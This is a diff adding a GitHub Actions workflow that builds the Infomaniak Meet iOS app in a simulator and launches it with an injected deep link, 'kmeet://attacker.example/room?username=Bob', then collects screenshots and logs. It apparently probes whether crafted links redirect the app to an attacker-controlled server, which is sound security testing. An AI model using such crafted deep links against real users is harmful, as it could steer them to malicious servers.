@@ -1,0 +1,44 @@
+name: kmeet-probe8
+on: workflow_dispatch
+jobs:
+  p:
+    runs-on: macos-latest
+    timeout-minutes: 120
+    steps:
+      - uses: actions/checkout@v4
+      - name: Boot
+        run: |
+          U=$(xcrun simctl list devices available | grep -m1 -i "iPhone 16" | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/')
+          [ -z "$U" ] && U=$(xcrun simctl list devices available | grep -m1 -i iPhone | sed -E 's/.*\(([0-9A-Fa-f-]{36})\).*/\1/')
+          echo "UDID=$U" >> $GITHUB_ENV
+          xcrun simctl boot "$U" || true; xcrun simctl bootstatus "$U" -b || true
+      - name: Build
+        run: |
+          set -o pipefail
+          xcodebuild -project MeetInfomaniak.xcodeproj -scheme MeetInfomaniak -configuration Debug -derivedDataPath "$PWD/build" -destination "platform=iOS Simulator,id=$UDID" build 2>&1 | tail -12
+      - name: Install
+        run: |
+          A=$(find "$PWD/build" -name "*.app" -maxdepth 8 | grep -vi "appex\|AppClip" | head -1); echo "app=$A"
+          xcrun simctl install "$UDID" "$A"
+      - name: RUN with attacker host + username (harness-injected URL)
+        run: |
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true
+          SIMCTL_CHILD_PROBE_URL="kmeet://attacker.example/room?username=Bob" xcrun simctl launch "$UDID" com.infomaniak.meet
+          for i in 4 8 14 20; do sleep 4; xcrun simctl io "$UDID" screenshot "A-$i.png" || true; done
+      - name: CONTROL without username param
+        run: |
+          xcrun simctl terminate "$UDID" com.infomaniak.meet || true; sleep 2
+          SIMCTL_CHILD_PROBE_URL="kmeet://attacker.example/room" xcrun simctl launch "$UDID" com.infomaniak.meet
+          for i in 4 10; do sleep 4; xcrun simctl io "$UDID" screenshot "B-$i.png" || true; done
+      - name: Logs
+        run: |
+          xcrun simctl spawn "$UDID" log show --last 3m --style compact --predicate 'processImagePath CONTAINS "MeetInfomaniak"' > applog.txt 2>&1 || true
+          grep -i "attacker.example" applog.txt | head -20 || echo "no attacker.example in app log"
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: ev8
+          path: |
+            *.png
+            applog.txt
+          if-no-files-found: warn
